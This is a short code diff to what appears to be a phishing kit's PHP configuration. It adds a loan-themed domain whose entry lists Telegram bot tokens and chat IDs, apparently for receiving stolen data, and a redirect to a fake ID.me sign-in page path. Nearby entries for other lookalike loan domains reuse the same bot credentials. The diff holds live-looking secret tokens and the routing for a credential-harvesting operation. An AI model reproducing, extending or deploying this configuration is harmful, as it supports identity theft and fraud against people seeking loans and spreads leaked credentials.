@@ -23,6 +23,16 @@ $site_map = [
         'redirect' => 'https://credibleloans.info/api.id.me/en/session/new.html'
     ],
 
+    'credibleloans.42web.io' => [
+        'bots' => [
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
+            ['token' => '8064658016:AAHEcSX8Y981ebjcAveqjyhS8sGkrGnYiq4', 'chat_id' => '7575811693']
+        ],
+        'redirect' => 'https://credibleloans.42web.io/api.id.me/en/session/new.html'
+    ],
+
+
+
     'upstartloansllc.onrender.com' => [
         'bots' => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
